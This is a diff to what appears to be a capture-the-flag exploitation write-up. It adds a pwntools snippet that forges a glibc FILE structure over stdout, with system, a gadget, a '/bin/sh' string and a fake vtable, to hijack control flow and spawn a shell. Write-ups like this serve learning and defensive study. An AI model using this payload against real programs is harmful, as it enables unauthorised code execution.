@@ -195,6 +195,18 @@ payload += p64(stdout + 0x1000)
 
 Now, the buffer for our write is located at `_IO_2_1_stdout_`. The next thing to do would be to overwrite stdout with our payload.
 
+```py
+fake = FileStructure(0)
+fake.flags = 0x3b01010101010101
+fake._IO_read_end=libc.sym['system']
+fake._IO_save_base = gadget
+fake._IO_write_end=u64(b'/bin/sh\x00')
+fake._lock=stdout_lock
+fake._codecvt= stdout + 0xb8
+fake._wide_data = stdout+0x200
+fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
+```
+
 ![image](https://github.com/user-attachments/assets/ed3c8a0d-a18c-4f47-aca7-60b5718e81c0)
 
 <details>
